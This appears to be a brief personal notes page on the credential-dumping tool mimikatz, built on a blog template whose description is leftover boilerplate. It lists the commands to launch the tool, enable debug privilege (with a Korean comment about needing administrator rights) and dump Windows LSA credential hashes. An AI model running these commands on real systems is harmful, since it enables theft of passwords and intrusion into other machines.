---
layout: page
title: mimikatz
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


```powershell
./mimikatz.exe
```

```powershell
# 이렇게 하면 mimikatz를 관리자로 실행하고 있습니다. MimiKatz를 관리자로 실행하지 않으면 MimiKatz가 제대로 실행되지 않습니다
privilege::debug
```

```powershell
lsadump::lsa /patch
```

